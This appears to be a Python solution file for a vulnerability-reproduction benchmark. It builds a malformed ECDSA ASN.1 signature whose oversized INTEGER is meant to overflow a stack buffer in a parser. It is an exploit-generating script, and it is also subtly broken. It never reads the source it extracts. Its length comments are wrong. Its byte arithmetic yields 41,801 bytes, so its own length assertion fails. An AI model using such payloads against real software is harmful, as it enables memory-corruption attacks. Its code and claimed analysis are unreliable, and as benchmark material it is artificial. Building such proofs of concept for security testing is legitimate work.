import os
import tarfile
import tempfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to analyze the vulnerable code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Look for vulnerable source files
            source_dir = os.path.join(tmpdir, 'src')
            
            # Based on typical ECDSA ASN.1 parsing vulnerabilities,
            # we need to craft a signature that will overflow a stack buffer
            # Common pattern: fixed-size buffer for ASN.1 parsing
            
            # Construct a malformed ECDSA signature that will cause stack overflow
            # The signature should be valid enough to pass initial checks but
            # overflow during parsing
            
            # ASN.1 structure for ECDSA signature:
            # SEQUENCE {
            #   INTEGER r,
            #   INTEGER s
            # }
            
            # Strategy: Create an extremely large INTEGER that will overflow
            # a fixed-size stack buffer during ASN.1 parsing
            
            # Ground truth length is 41798 bytes, so we'll aim for that
            
            # Start with ASN.1 SEQUENCE tag
            poc = b'\x30'  # SEQUENCE tag
            
            # The total length will be 41797 bytes (41798 total - 1 for SEQUENCE tag)
            # Using long form length encoding (since length > 127)
            seq_length = 41797
            
            # For lengths > 65535, we need 3 bytes for length encoding
            # 0x82 indicates 2 length bytes follow
            length_bytes = struct.pack('>H', seq_length)
            poc += b'\x82' + length_bytes
            
            # Now add the INTEGER r with huge content
            # INTEGER tag
            poc += b'\x02'  # INTEGER tag
            
            # Make r value extremely large to overflow buffer
            # We'll use 41790 bytes for r value
            r_length = 41790
            
            # Calculate remaining space for s
            # Current size: 1 (seq tag) + 3 (seq len) + 1 (int tag) + len(r_len_bytes) + r_length
            r_len_bytes = b''
            if r_length > 127:
                if r_length <= 255:
                    r_len_bytes = b'\x81' + struct.pack('B', r_length)
                elif r_length <= 65535:
                    r_len_bytes = b'\x82' + struct.pack('>H', r_length)
                else:
                    # r_length is 41790, which fits in 2 bytes
                    r_len_bytes = b'\x82' + struct.pack('>H', r_length)
            
            poc += r_len_bytes
            
            # Add r value that will cause overflow
            # Use pattern that's likely to trigger memory corruption
            # Fill with 'A's (0x41) which is easy to recognize in debuggers
            poc += b'A' * r_length
            
            # Add INTEGER s (normal small value)
            poc += b'\x02\x01\x05'  # INTEGER tag, length 1, value 5
            
            # Verify total length
            assert len(poc) == 41798, f"Generated PoC length {len(poc)} != 41798"
            
            return poc
